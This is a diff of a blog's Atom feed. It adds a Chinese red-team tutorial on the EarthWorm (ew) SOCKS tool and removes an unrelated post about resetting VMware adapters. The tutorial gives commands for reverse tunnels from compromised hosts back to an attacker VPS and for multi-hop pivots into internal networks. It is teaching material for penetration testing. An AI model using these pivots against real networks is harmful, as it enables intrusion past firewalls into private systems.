@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-06-08T13:51:21.517Z</updated>
+  <updated>2021-06-10T11:51:35.914Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】10、ew 的使用</title>
+    <link href="https://www.teamssix.com/year/210610-164507.html"/>
+    <id>https://www.teamssix.com/year/210610-164507.html</id>
+    <published>2021-06-10T08:45:07.000Z</published>
+    <updated>2021-06-10T11:51:35.914Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p><p><a href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p><p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p><p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p><p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p><p>开始之前，先理解下正向代理和反向代理的区别。</p><blockquote><p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p><p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p></blockquote><h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p><blockquote><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p></blockquote><p>这个描述也是很形象了。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p><h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p><p>命令也很简单</p><pre><code>ew -s ssocksd -l 1080</code></pre><pre><code> -s 设置状态模式 -l 设置监听端口</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 1080ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server</code></pre><p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p><h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p><p>在公网 VPS 上执行以下命令：</p><pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre><pre><code> -e 设置反弹主机端口</code></pre><pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444</code></pre><p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p><p>在目标主机上执行以下命令：</p><pre><code>ew -s rssocks -d vps_ip -e 4444</code></pre><pre><code>-d 设置反弹主机 IP</code></pre><pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444</code></pre><p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p><p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png"></p><h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p><p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p><pre><code>内网主机A（有公网IP） --》内网主机B --》内网资源</code></pre><p>在内网主机B上，开启正向连接代理</p><pre><code>ew -s ssocksd -l 4444</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 4444</code></pre><p>在内网主机A上</p><pre><code>ew -s lcx_tran -l 1080 -f hostB_ip -g 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444</code></pre><p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p><h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p><pre><code>VPS --》内网主机A --》内网主机B --》内网资源</code></pre><p>在公网 VPS 上</p><pre><code>ew -s lcx_listen -l 1080 -e 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_listen -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here</code></pre><p>表示将 1080 收到的 代理请求转发到 4444 端口上</p><p>在内网主机 B 上</p><pre><code>ew -s ssocksd -l 5555</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 5555</code></pre><p>表示开启 5555 端口的正向代理</p><p>在内网主机 A 上</p><pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre><p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p><p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p><h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p><pre><code>VPS --》内网主机 A --》内网主机 B --》内网主机 C</code></pre><p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p><pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here</code></pre><p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p><pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre><p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p><pre><code>ew -s lcx_listen -l 5555 -e 6666</code></pre><pre><code>&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666init cmd_server_for_rc herestart listen port here</code></pre><p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p><pre><code>ew -s rssocks -d 192.168.7.110 -e 6666</code></pre><pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server</code></pre><p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p><p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1、Socks-代理工具介绍&quot;&gt;&lt;a href=&quot;#1、Socks-代理工具介绍&quot; class=&quot;headerlink&quot; title=&quot;1、Socks 代理工具介绍&quot;&gt;&lt;/a&gt;1、Socks 代理工具介绍&lt;/h2&gt;&lt;p&gt;Socks 代理可以理解成升级版的 lcx，</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】9、iodine 使用</title>
@@ -555,30 +583,6 @@
     <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【经验总结】电脑休眠后虚拟网卡地址变成169.254网段的解决方法</title>
-    <link href="https://www.teamssix.com/year/201015-194551.html"/>
-    <id>https://www.teamssix.com/year/201015-194551.html</id>
-    <published>2020-10-15T11:45:51.000Z</published>
-    <updated>2020-10-15T02:00:42.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一直以来会遇到一个问题，就是电脑在休眠后再次打开电脑，在使用虚拟机时网络老是会碰到问题，此时如果查看物理机上虚拟网卡的地址就会发现 IP 地址变成了 169.254.xxx.xxx 。</p><p>之所以会出现这个问题是因为 Windows 在网络不通的情况下，会自动配置一个169.254.xxx.xxx这个地址段的IP地址。</p><h1 id="0x01-常规解决方法"><a href="#0x01-常规解决方法" class="headerlink" title="0x01 常规解决方法"></a>0x01 常规解决方法</h1><p>在<code>控制面板 -&gt; 网络和 Internet -&gt; 网络共享中心</code>里找到<code>更改适配器设置</code>，然后再找到有问题的网卡，右击禁用再启用就可以了。</p><p>但是虚拟机的虚拟网卡往往会有多个，一个个禁用启用难免有些麻烦，而且整个步骤也是比较繁琐的，因此下面看一下使用批处理文件的方式。</p><h1 id="0x02-批处理文件"><a href="#0x02-批处理文件" class="headerlink" title="0x02 批处理文件"></a>0x02 批处理文件</h1><p>其实原理也很简单，直接禁用网卡再重启网卡即可，为了更加贴合使用，我在里面加入了注释、延时的功能。</p><p>将以下内容保存到本地，后缀重命名为 <code>.bat</code> 文件，双击执行就可以重启对应的网卡了。当然 bat 文件里的网卡名称要换成自己的网卡名称，比如我这里的是 <code>VMware Network Adapter VMnet1</code>等三个网卡。</p><pre><code>ipconfigrem &quot;禁用网卡 VMware Network Adapter VMnet1&quot;netsh interface set interface &quot;VMware Network Adapter VMnet1&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet1&quot;netsh interface set interface &quot;VMware Network Adapter VMnet1&quot; enabledrem &quot;禁用网卡 VMware Network Adapter VMnet3&quot;netsh interface set interface &quot;VMware Network Adapter VMnet3&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet3&quot;netsh interface set interface &quot;VMware Network Adapter VMnet3&quot; enabledrem &quot;禁用网卡 VMware Network Adapter VMnet7&quot;netsh interface set interface &quot;VMware Network Adapter VMnet7&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet7&quot;netsh interface set interface &quot;VMware Network Adapter VMnet7&quot; enabledipconfigchoice /t 5 /c YN /d Y</code></pre><p>其中 <code>rem</code> 起到注释作用，<code>choice /t 5 /c YN /d Y</code> 起到延时5秒的作用，两次的 ifconfig 主要用来查看重启前后的网卡IP地址情况。</p><blockquote><p>参考链接：</p><p><a href="https://iknow.lenovo.com.cn/detail/dc_182859.html">https://iknow.lenovo.com.cn/detail/dc_182859.html</a></p><p><a href="https://blog.csdn.net/jk110333/article/details/41869053">https://blog.csdn.net/jk110333/article/details/41869053</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;一直以来会遇到一个问题，就是电脑在休眠后再次打开电脑，在使用虚拟机时网络老是会碰到问题，此时如果查看</summary>
-      
-    
-    
-    
-    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
-    
-    
-    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
     
   </entry>
   
